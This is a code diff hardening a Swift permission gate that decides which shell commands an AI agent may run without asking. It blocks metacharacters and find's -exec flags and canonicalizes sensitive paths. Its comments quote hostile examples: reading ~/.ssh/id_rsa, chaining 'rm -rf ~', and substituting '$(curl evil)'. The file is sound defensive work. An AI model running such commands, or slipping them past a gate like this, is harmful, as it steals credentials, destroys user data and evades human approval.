@@ -97,7 +97,8 @@ public actor SecurityGate {
         #"^shasum\s"#,
         // Directory listing and search
         #"^ls(\s|$)"#,
-        #"^find\s"#,
+        // NOTE: `find` deliberately omitted — it has -exec/-execdir/-ok which run
+        // arbitrary commands (Finding 2c). Use the file_search tool instead.
         #"^tree(\s|$)"#,
         #"^du[\s]"#,
         #"^df(\s|$)"#,
@@ -122,8 +123,10 @@ public actor SecurityGate {
         #"^ioreg"#,
         #"^pmset\s+-g"#,
         // Environment (read-only)
-        #"^echo\s"#,
-        #"^printf\s"#,
+        // NOTE: `echo` / `printf` deliberately omitted — their arguments undergo
+        // `$(...)` / backtick command substitution, so a "safe" echo can execute
+        // arbitrary commands (Finding 2c). The metacharacter reject below is the
+        // primary guard, but dropping them removes the auto-allow surface entirely.
         #"^env$"#,
         #"^printenv"#,
         #"^which\s"#,
@@ -217,16 +220,23 @@ public actor SecurityGate {
             return handoff
         }
 
-        // 2. Command-aware classification for shell execution tools
+        // 2. Sensitive path check — MUST run BEFORE the safe-command auto-allow
+        // (Finding 2b). A read-only "safe" command (e.g. `cat ~/.ssh/id_rsa`)
+        // must NOT be able to short-circuit the sensitive-path gate. The gate
+        // canonicalizes each path argument (Finding 1) so `..` / symlink /
+        // non-canonical forms cannot slip past the prefix comparison.
+        if let sensitiveResult = await checkSensitivePaths(allStrings, toolName: toolName) {
+            return sensitiveResult
+        }
+
+        // 3. Command-aware classification for shell execution tools. Only a
+        // single simple read-only command (no shell metacharacters / process
+        // substitution / `-exec`) auto-allows; everything else falls through to
+        // the normal tier prompt below (Finding 2a).
         if toolName == "shell_exec" || toolName == "cli_exec" {
             if checkSafeCommand(detail) {
                 return .allow
             }
-        }
-
-        // 3. Sensitive path check
-        if let sensitiveResult = await checkSensitivePaths(allStrings, toolName: toolName) {
-            return sensitiveResult
         }
 
         // 4. Tier-based logic
@@ -273,9 +283,60 @@ public actor SecurityGate {
 
     // MARK: Command Classification (V1-PATCH-001)
 
+    /// Shell control / expansion metacharacters that turn a "single simple
+    /// command" into a compound command, a pipeline, a redirection, or a
+    /// command/parameter substitution. If ANY of these appear, the auto-allow is
+    /// refused and the call falls through to the normal tier prompt
+    /// (Finding 2a) — even if the leading token matches a safe pattern, because
+    /// e.g. `cat x ; rm -rf ~` or `cat $(curl evil)` is NOT read-only.
+    ///
+    /// Note: `*` / `?` / `[` (globs) and `~` (tilde) are intentionally NOT here —
+    /// they expand to filenames, not commands, and blocking them would break
+    /// legitimate read-only invocations like `cat ~/notes/*.txt`. Path-based
+    /// abuse is still caught by the sensitive-path gate, which now runs first.
+    private static let shellMetacharacters: Set<Character> = [
+        ";", "&", "|", "`", "$", "(", ")", "<", ">", "\n", "\r", "{", "}", "\\"
+    ]
+
+    /// `find`'s action primaries execute arbitrary commands. Even though `find`
+    /// is no longer in the safe list, these are rejected defensively so a future
+    /// re-addition (or any other tool gaining an exec-style flag) can't silently
+    /// reopen the hole (Finding 2c).
+    private static let unsafeCommandFlags = ["-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint"]
+
     private func checkSafeCommand(_ command: String) -> Bool {
+        SecurityGate.isAutoAllowableSafeCommand(command)
+    }
+
+    /// Pure classifier for the safe-command auto-allow. `true` ONLY for a single
+    /// simple read-only command with no shell control/expansion metacharacters
+    /// and no command-executing flag (Finding 2). Exposed (nonisolated static)
+    /// so the metacharacter / `-exec` reject cases are directly unit-testable.
+    public static func isAutoAllowableSafeCommand(_ command: String) -> Bool {
         let trimmed = command.trimmingCharacters(in: .whitespacesAndNewlines)
-        for pattern in SecurityGate.safeCommandPatterns {
+        guard !trimmed.isEmpty else { return false }
+
+        // (Finding 2a) Refuse the auto-allow for anything that is not a single
+        // simple command. Any shell control/expansion metacharacter means the
+        // string can run more than the matched read-only command, so it must go
+        // through the normal tier prompt + sensitive-path gate instead.
+        if trimmed.contains(where: { shellMetacharacters.contains($0) }) {
+            return false
+        }
+
+        // (Finding 2c) Reject command-executing flags regardless of position.
+        // Tokenize on whitespace so `-exec` is matched as a whole argument
+        // (substring matching would also trip on innocuous values).
+        let tokens = trimmed.split(whereSeparator: { $0 == " " || $0 == "\t" }).map(String.init)
+        if tokens.contains(where: { unsafeCommandFlags.contains($0.lowercased()) }) {
+            return false
+        }
+
+        // Now require the whole command to match exactly one anchored safe
+        // pattern. The patterns are start-anchored (`^…`); combined with the
+        // metacharacter reject above this means the entire string is a single
+        // read-only command.
+        for pattern in safeCommandPatterns {
             if let regex = try? NSRegularExpression(pattern: pattern, options: .caseInsensitive) {
                 let range = NSRange(trimmed.startIndex..., in: trimmed)
                 if regex.firstMatch(in: trimmed, options: [], range: range) != nil {
@@ -289,34 +350,25 @@ public actor SecurityGate {
     // MARK: Sensitive Path Check
 
     public func checkSensitivePaths(_ strings: [String], toolName: String) async -> GateDecision? {
-        let home = FileManager.default.homeDirectoryForCurrentUser.path
-
-        for str in strings {
-            let expanded: String
-            if str.hasPrefix("~/") {
-                expanded = home + str.dropFirst(1)
-            } else if str.hasPrefix("~") {
-                expanded = home + str.dropFirst(1)
-            } else {
-                expanded = str
+        // Pre-canonicalize the configured sensitive prefixes once. Each becomes a
+        // list of path components rooted at "/", so matching is done on whole
+        // components (Finding 1) — `~/.config` will NOT match `~/.config-x`,
+        // which a raw String.hasPrefix wrongly accepts.
+        let sensitiveSpecs: [(original: String, components: [String])] =
+            ConfigManager.shared.sensitivePaths.map { sensitive in
+                (sensitive, SecurityGate.canonicalComponents(for: sensitive))
             }
 
-            // PKT-363 D2: Dynamic read from config-backed list (fallback to defaults on error)
-            for sensitive in ConfigManager.shared.sensitivePaths {
-                let expandedSensitive: String
-                if sensitive.hasPrefix("~/") {
-                    expandedSensitive = home + String(sensitive.dropFirst(1))
-                } else {
-                    expandedSensitive = sensitive
-                }
+        for str in strings {
+            let candidateComponents = SecurityGate.canonicalComponents(for: str)
 
-                let matches = expanded.hasPrefix(expandedSensitive) ||
-                              expanded.hasPrefix(expandedSensitive + "/") ||
-                              str.hasPrefix(sensitive) ||
-                              str.hasPrefix(sensitive + "/")
+            for spec in sensitiveSpecs {
+                guard SecurityGate.componentsAreUnderPrefix(
+                    candidate: candidateComponents,
+                    prefix: spec.components
+                ) else { continue }
 
-                guard matches else { continue }
-
+                let sensitive = spec.original
                 let key = SecurityGate.permanentAllowPrefix + sensitive
                 if UserDefaults.standard.bool(forKey: key) {
                     return nil
@@ -347,6 +399,67 @@ public actor SecurityGate {
             }
         }
         return nil
+    }
+
+    // MARK: Path Canonicalization (Finding 1)
+
+    /// Canonicalize a path argument to absolute, symlink-resolved, `..`/`.`-
+    /// collapsed path COMPONENTS for sensitive-path comparison.
+    ///
+    /// Steps (kept in lockstep with how the file tools ultimately open the path,
+    /// so the gate and the syscall agree):
+    ///  1. Expand a leading `~` / `~user` via `NSString.expandingTildeInPath`
+    ///     (the file tools use the same expansion).
+    ///  2. Resolve symlinks + standardize. For a target that does not exist yet
+    ///     (a create/write destination), `resolvingSymlinksInPath` cannot resolve
+    ///     the leaf, so resolve the PARENT directory, then re-attach the final
+    ///     component and standardize — this collapses any residual `..` that a
+    ///     non-existent leaf would otherwise leave in place.
+    ///  3. Return the path split into non-empty components (the leading "/" is
+    ///     dropped), which is what `componentsAreUnderPrefix` matches on.
+    ///
+    /// Exposed for regression testing of the `..` / symlink / trailing-component
+    /// cases the audit calls out.
+    public static func canonicalComponents(for rawPath: String) -> [String] {
+        let trimmed = rawPath.trimmingCharacters(in: .whitespacesAndNewlines)
+        guard !trimmed.isEmpty else { return [] }
+
+        // 1. Expand ~ exactly as the file tools do.
+        let expanded = (trimmed as NSString).expandingTildeInPath
+
+        // Relative paths are resolved against the current working directory so a
+        // bare `.ssh/id_rsa` (or `../.ssh`) cannot dodge the gate by omitting the
+        // leading slash.
+        let base = URL(fileURLWithPath: expanded)
+
+        // 2. Resolve symlinks + standardize. resolvingSymlinksInPath() also
+        // standardizes (collapses `.`/`..`) when the path exists. For a
+        // not-yet-existing leaf, resolve the parent then re-append + standardize.
+        let canonical: URL
+        if FileManager.default.fileExists(atPath: base.path) {
+            canonical = base.resolvingSymlinksInPath().standardizedFileURL
+        } else {
+            let parent = base.deletingLastPathComponent()
+            let resolvedParent = parent.resolvingSymlinksInPath().standardizedFileURL
+            canonical = resolvedParent
+                .appendingPathComponent(base.lastPathComponent)
+                .standardizedFileURL
+        }
+
+        return canonical.pathComponents.filter { $0 != "/" && !$0.isEmpty }
+    }
+
+    /// True iff `candidate`'s components are equal to, or strictly nested under,
+    /// `prefix`'s components — matched on whole components so `~/.config-x` does
+    /// NOT count as being under `~/.config` (Finding 1). An empty prefix never
+    /// matches (defensive: a misconfigured empty sensitive entry must not gate
+    /// every path).
+    public static func componentsAreUnderPrefix(candidate: [String], prefix: [String]) -> Bool {
+        guard !prefix.isEmpty, candidate.count >= prefix.count else { return false }
+        for (i, component) in prefix.enumerated() where candidate[i] != component {
+            return false
+        }
+        return true
     }
 
     // MARK: Notification Approval (Request-tier tools)
